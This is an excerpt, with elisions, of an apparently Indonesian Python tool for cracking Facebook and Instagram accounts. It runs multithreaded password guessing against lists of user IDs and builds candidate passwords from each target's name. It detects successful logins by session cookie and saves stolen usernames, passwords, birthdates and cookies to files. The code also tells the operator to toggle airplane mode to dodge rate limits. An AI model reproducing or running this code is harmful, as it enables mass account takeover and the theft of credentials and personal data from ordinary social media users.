...
author = 'MULYADI ZAMAS'
fb_me = 'me.210501'
github = 'github.com/Mullyadizamas'
...
def Masuk():
	...
	try:
		...
		os.system('clear')
		banner()
		print ('\n \x1b[1;92m[\x1b[1;97m01\x1b[1;92m] \x1b[1;97mLogin instagram \x1b[1;91m[\x1b[1;97mcrack akun instagram\x1b[1;91m] ')
		print (' \x1b[1;92m[\x1b[1;97m02\x1b[1;92m] \x1b[1;97mLogin via cookie \x1b[1;91m[\x1b[1;97mcrack akun facebook\x1b[1;97m] ')
		print (' \x1b[1;92m[\x1b[1;97m03\x1b[1;92m] \x1b[1;97mCara mendapatkan cookie facebook \x1b[1;91m[\x1b[1;97mtutor\x1b[1;91m] ')
		print (' \x1b[1;92m[\x1b[1;97m00\x1b[1;92m] \x1b[1;97mKeluar \x1b[1;91m[\x1b[1;97mlog out\x1b[1;91m] ')
		while True:
...
class Menu():
	...
	def tentang(self):
		...
		if "mbasic_logout_button" not in a:
			...
			print ('%s\x1b[1;92m [%s\x1b[1;97m02%s\x1b[1;92m] %s\x1b[1;97mCrack dari total pengikut'%(H,P,H,O))
			print ('%s\x1b[1;92m [%s\x1b[1;97m03%s\x1b[1;92m] %s\x1b[1;97mCrack user instagram %s\x1b[1;92mpro'%(H,P,H,O,H))
			print ('%s\x1b[1;92m [%s\x1b[1;97m04%s\x1b[1;92m] %s\x1b[1;97mLihat hasil crack'%(H,P,H,O))
			print ('%s\x1b[1;92m [%s\x1b[1;97m05%s\x1b[1;92m] %s\x1b[1;97mCheckpoint detektor'%(H,P,H,O))
			print ('%s\x1b[1;92m [%s\x1b[1;97mrm%s\x1b[1;92m] %s\x1b[1;97mHapus data login'%(H,P,H,O))
			print ('%s\x1b[1;92m [%s\x1b[1;97m00%s\x1b[1;92m] %s\x1b[1;97mKeluar %s\x1b[1;91m(%s\x1b[1;97mlogout%s\x1b[1;91m)'%(H,P,H,O,P,M,P))
...
class pilihan:
	...
	def menu(self):
		...
		if slut in['',' ']:
			...
			print ("\n%s%s%s\x1b[1;92m [\x1b[1;97m01\x1b[1;92m] %s\x1b[1;97mCek hasil akun facebook "%(U,til,P,O))
			print ("%s%s%s\x1b[1;92m [\x1b[1;97m02\x1b[1;92m] %s\x1b[1;97mCek hasil akun instagram "%(U,til,P,O))
			print ("%s%s%s\x1b[1;92m [\x1b[1;97m03\x1b[1;92m] %s\x1b[1;97mHapus hasil crack "%(U,til,P,O))
			print ("%s%s%s\x1b[1;92m [\x1b[1;97m00\x1b[1;92m] %s\x1b[1;97mKembali "%(U,til,M,O))
			rom = input('\n%s \x1b[1;92m[\x1b[1;97m#\x1b[1;92m] %s\x1b[1;97mPilih \x1b[1;91m: \x1b[1;97m'%(P,O,M,K))
			cek_cek(rom)
		elif slut in['5','05']:
			file_cp()
		elif slut in['RM','Rm','rm']:
			print ('\n%s%s tunggu sebentar '%(M,til));jeda(1)
			try:
...
class Crack:
				...
				if pwx == '':
					...
					def manual(brute=None):
						...
						if ind =='':
							...
							print ('\n%s%s%s akun %s[\x1b[1;92mOK] %stersimpan ke file %s> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							print ('%s%s%s akun %s[%s\x1b[1;93mCP%s]%s tersimpan ke file %s> %s\x1b[1;93mCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
							...
							print ('\n%s%s%s akun %s[\x1b[1;92mOK] %stersimpan ke file %s> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							print ('%s%s%s akun %s[\x1b[1;93m%sCP%s]%s tersimpan ke file %s> %s\x1b[1;93mCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
							jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.touchV2, _heck_, brute)
									except: pass
							hasil(ok,cp)
						elif ind in ('5', '05'):
							print ('\n%s%s%s akun %s[\x1b[1;92mOK] %stersimpan ke file %s> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							...
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.basicV2, _heck_, brute)
									except: pass
							hasil(ok,cp)
						elif ind in ('6', '06'):
							print ('\n%s%s%s akun %s[\x1b[1;92mOK] %stersimpan ke file %s> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							...
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.mobilV2, _heck_, brute)
									except: pass
							hasil(ok,cp)
						else:
							print ('\n%s%s isi yang benar kentod'%(M,til))
							manual()
					print ('\n%s\x1b[1;96m•%s\x1b[1;93m [ %s\x1b[1;97mpilih methode login, silahkan coba satu² %s\x1b[1;93m]\n'%(U,O,U,O))
					print ('%s\x1b[1;96m• %s\x1b[1;92m[\x1b[1;97m01\x1b[1;92m]%s \x1b[1;97mmethode %sfree \x1b[1;91m[%s\x1b[1;97mfast \x1b[1;93m+\x1b[1;97m cookie\x1b[1;91m] '%(U,P,O,M,O))
					print ('%s\x1b[1;96m• %s\x1b[1;92m[\x1b[1;97m02\x1b[1;92m]%s \x1b[1;97mmethode %smbasic \x1b[1;91m[%s\x1b[1;97mslow \x1b[1;93m+\x1b[1;97m cookie\x1b[1;91m] '%(U,P,O,P,O))
					print ('%s\x1b[1;96m• %s\x1b[1;92m[\x1b[1;97m03\x1b[1;92m]%s \x1b[1;97mmethode %smobile \x1b[1;91m[%s\x1b[1;97mvery slow \x1b[1;93m+\x1b[1;97m cookie\x1b[1;91m] '%(U,P,O,H,O))
					print ('%s\x1b[1;96m• %s\x1b[1;92m[\x1b[1;97m04\x1b[1;92m]%s \x1b[1;97mmethode %sfree \x1b[1;91m[%s\x1b[1;97mfast no cookie\x1b[1;91m] '%(U,P,O,M,O))
					print ('%s\x1b[1;96m• %s\x1b[1;92m[\x1b[1;97m05\x1b[1;92m]%s \x1b[1;97mmethode %smbasic \x1b[1;91m[%s\x1b[1;97mslow no cookie\x1b[1;91m] '%(U,P,O,H,O))
					print ('%s\x1b[1;96m• %s\x1b[1;92m[\x1b[1;97m06\x1b[1;92m]%s \x1b[1;97mmethode %smobile \x1b[1;91m[%s\x1b[1;97mvery slow no cookie\x1b[1;91m] '%(U,P,O,H,O))
					manual(pwx.split(','))
					break
		elif unikers in ('T', 't'):
			print ('\n%s\x1b[1;96m•%s \x1b[1;93m[ %s\x1b[1;97mpilih methode login, silahkan coba satu²%s \x1b[1;93m]\n'%(U,O,U,O))
	...
	def langsung(self):
		...
		if suuu == '':
			...
			print ('\n%s%s%s akun %s[\x1b[1;92mOK] %stersimpan ke file %s\x1b[1;91m> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s%s%s akun %s[%s\x1b[1;93mCP%s]%s tersimpan ke file %s\x1b[1;91m> %s\x1b[1;93mCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
				...
				for akun in self.id: 
					try:
						...
						if len(na) == 1:
							...
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.touchV2, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('5', '05'):
			print ('\n%s%s%s akun %s[\x1b[1;92mOK] %stersimpan ke file %s\x1b[1;91m> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
				...
				for akun in self.id: 
					try:
						...
						if len(na) == 1:
							...
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.basicV2, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('6', '06'):
			print ('\n%s%s%s akun %s[\x1b[1;92mOK] %stersimpan ke file %s\x1b[1;91m> %s\x1b[1;92mOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
				...
				for akun in self.id: 
					try:
						...
						if len(na) == 1:
							...
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.mobilV2, uid, pwx)
					except: pass
			hasil(ok,cp)
		else:
			print("%s%s Isi yang benar kentod "%(M,til))
	...
	def touch(self, user, manual, **data):
		...
		sys.stdout.write('\r'+warna+'•\x1b[1;92m [\x1b[1;97mproses\x1b[1;92m]\x1b[1;97m %s/%s [%s\x1b[1;92mOK%s:%s%s%s]-[%s\x1b[1;93mCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				...
				if "c_user" in ses.cookies.get_dict():
					try:
						...
						month = bulan12[month]
						print ('\r %s\x1b[1;92mOK %s|%s|%s %s %s|%s '%(H,user,pw,day,month,year,kukis))
						#os.popen("play-audio dapet.mp3")
						ok.append("%s|%s|%s %s %s|%s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" \x1b[1;92mOK %s|%s|%s %s %s|%s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						...
						pass
					print ('\r %s\x1b[1;92mOK %s|%s|%s '%(H,user,pw,kukis))
					#os.popen("play-audio dapet.mp3")
					ok.append('%s|%s|%s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' \x1b[1;92mOK %s|%s|%s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
					...
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s\x1b[1;93mCP %s|%s|%s %s %s  '%(K,user,pw,day,month,year))
						#os.popen("play-audio dapet.mp3")
						cp.append("%s|%s|%s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" \x1b[1;93mCP %s|%s|%s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						...
						pass
					print ('\r %s\x1b[1;93mCP %s|%s           '%(K,user,pw))
					#os.popen("play-audio dapet.mp3")
					cp.append('%s|%s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" \x1b[1;93mCP %s|%s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
	...
	def touchV2(self, user, manual, **data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;97m proses %s/%s [%s\x1b[1;92mOK%s:%s%s%s]-[%s\x1b[1;93mCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				...
				if "c_user" in ses.cookies.get_dict():
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s\x1b[1;92mOK---> %s|%s|%s %s %s '%(H,user,pw,day,month,year))
						#os.popen("play-audio dapet.mp3")
						ok.append("%s|%s|%s %s %s "%(user,pw,day,month,year))
						open('OK/%s.txt' %(waktu), 'a').write(" \x1b[1;92mOK---> %s|%s|%s %s %s \n"%(user,pw,day,month,year))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						...
						pass
					print ('\r %s\x1b[1;92mOK---> %s|%s '%(H,user,pw))
					#os.popen("play-audio dapet.mp3")
					ok.append('%s|%s '%(user,pw))
					open('OK/%s.txt'%(waktu), 'a').write(' \x1b[1;92mOK---> %s|%s\n'%(user,pw))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
			...
			jeda(1)
			loop += 1
			self.touchV2(user, manual, **data)
			
	def basicV2(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;97m proses %s/%s [%s\x1b[1;92mOK%s:%s%s%s]-[%s\x1b[1;93mCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			...
			jeda(1)
			loop += 1
			self.basicV2(user, manual, **data)
		
	def mobilV2(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;97m proses %s/%s [%s\x1b[1;92mOK%s:%s%s%s]-[%s\x1b[1;93mCP%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
